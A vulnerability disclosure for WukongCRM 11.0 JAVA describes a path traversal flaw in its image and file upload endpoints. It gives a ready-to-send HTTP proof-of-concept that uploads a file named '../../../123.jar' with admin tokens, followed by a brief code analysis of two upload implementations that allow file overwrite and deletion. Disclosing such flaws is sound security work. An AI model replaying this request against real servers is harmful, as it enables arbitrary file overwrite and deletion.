# **<font style="color:#1a1a1a;">Version:</font>**

[v11.3.3 · WuKongOpenSource/WukongCRM-11.0-JAVA@ec00867 · GitHub](https://github.com/WuKongOpenSource/WukongCRM-11.0-JAVA/commit/ec00867f418d4046ac25c46379af85c034a37e1c)

# Sphere of influence Of API:

<font style="color:#333333;">/</font><font style="color:#9ecbff;background-color:#24292e;">adminFile/upload</font>

<font style="color:#333333;">/</font><font style="color:#9ecbff;background-color:#24292e;">adminUser</font><font style="color:#9ecbff;background-color:#24292e;">/</font><font style="color:#9ecbff;background-color:#24292e;">updateImg</font>

# **<font style="color:#1a1a1a;">Poc</font>**

```plain
POST /api-11/adminUser/updateImg HTTP/1.1
Host: your ip
Cookie: Admin-Token=496eff311bbd4d8aba3716ea5bea5434; AdminToken=496eff311bbd4d8aba3716ea5bea5434
Content-Length: 8393
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: zh-CN
Sec-Ch-Ua: "Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"
Admin-Token: 496eff311bbd4d8aba3716ea5bea5434
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryRWQ5uMKBTVp3Warh
Origin: https://www.72crm.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://www.72crm.com/cloud/
Accept-Encoding: gzip, deflate
Priority: u=1, i
Connection: close

------WebKitFormBoundaryRWQ5uMKBTVp3Warh
Content-Disposition: form-data; name="userId"

1860721546925346816
------WebKitFormBoundaryRWQ5uMKBTVp3Warh
Content-Disposition: form-data; name="file"; filename="../../../123.jar"
Content-Type: image/png
```

![](https://cdn.nlark.com/yuque/0/2024/png/2897054/1732524717823-53f7d9bb-e85e-4e02-9e27-01cf36a80bf4.png)

# **<font style="color:#1a1a1a;">Code Analysis details</font>**

<font style="color:#333333;">use API </font><font style="color:#333333;">/</font><font style="color:#9ecbff;background-color:#24292e;">adminUser</font><font style="color:#9ecbff;background-color:#24292e;">/</font><font style="color:#9ecbff;background-color:#24292e;">updateImg </font><font style="color:#333333;">for verification</font>

![](https://cdn.nlark.com/yuque/0/2024/png/2897054/1732524717854-6faa6c57-3912-432f-a6c3-a0aeafbdd3fc.png)

<font style="color:#333333;">Follow in the code of com.kakarote.core.servlet.upload.FileService#uploadFile</font>

![](https://cdn.nlark.com/yuque/0/2024/png/2897054/1732524717761-8b6eed9c-d247-46aa-8fa4-5a75318da572.png)

<font style="color:#333333;">just u can see。</font><font style="color:#333333;">There are several implementation classes,</font>

![](https://cdn.nlark.com/yuque/0/2024/png/2897054/1732524717809-5b920888-f093-4815-aa59-79aff5f24d74.png)

<font style="color:#333333;">CASE 1: </font><font style="color:#333333;">com.kakarote.core.servlet.upload.LocalFileServiceImpl#uploadFile</font>

<font style="color:#333333;">This does not process the path, it is spliced into the file path, and writes the maliciously uploaded file content to the local service。Lead to the existence of /.. /.. / Malicious upload files that can overwrite files on the server,</font>

![](https://cdn.nlark.com/yuque/0/2024/png/2897054/1732524717742-d0c06f68-596a-45e7-9e24-2781e6512a6b.png)

<font style="color:#333333;">CASE2: com.kakarote.core.servlet.upload.TencentFileServiceImpl#uploadFile</font>

<font style="color:#333333;">The implementation class deletes the file through the cloud storage uploaded after the file is temporarily stored, but the path is not verified, resulting in the existence of... /.. /.. / Malicious upload files that can overwrite files on the server and eventually achieve arbitrary file delet</font>

![](https://cdn.nlark.com/yuque/0/2024/png/2897054/1732524718795-538ebaf1-464c-458b-8cc1-91f84ee64fb0.png)

